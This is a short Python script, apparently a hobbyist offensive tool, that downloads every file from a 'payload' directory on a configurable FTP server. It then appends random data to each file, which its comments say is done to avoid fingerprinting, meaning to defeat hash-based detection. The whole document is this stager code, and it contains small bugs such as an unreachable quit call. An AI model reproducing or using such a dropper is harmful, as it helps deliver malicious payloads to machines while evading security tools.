#Copyright 2017 NetsecBeginner
#=======================================================================
''' This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''
#=======================================================================

#Settings Object - **Change Settings Here**
class Settings():
	Obfuscate = True	#Toggle Obfuscate File(s) After Download
	FTPServer = "" 		#Name of Your FTP Server Goes Here
	Path = ""			#Path of The Payload Goes Here

#Get File(s) From FTP Server, Obfuscate File(s)
def main():
	#Import getcwd to get Working Directory
	from os import getcwd
	
	#Get Files
	files = ftp(Settings.FTPServer, Settings.Path)
	
	#Obfuscate Files
	if Settings.Obfuscate:
		for f in files:
			obfuscate(getcwd() + "/" + f)
	
#Get File From FTP Server
def ftp(Server, Path):
	#Import FTP to Create FTP Client
	from ftplib import FTP

	#Log in to FTP Server and Download Payload
	client = FTP(Server)
	client.login()
	client.cwd(Path)
	files = client.nlst()
	try:
		for f in files:
			client.retrbinary("RETR " + f, open(f, "wb").write)
	except:
		print("Unable To Transfer Some Files")
	return files
	
	#Close FTP Client
	client.quit()

#Append Random Data to File to Avoid Fingerprinting
def obfuscate(File):
	#Import SystemRandom To Append Random Data
	from random import SystemRandom, randint
	
	#Create Random Data To Append to File
	data = ""
	for i in range(randint(0, 20)):
		data = data + str(SystemRandom().random())
	
	#Open File and Write Random Data
	f = open(str(File), "a+b")
	f.write(data)

#Call Main Function
main()
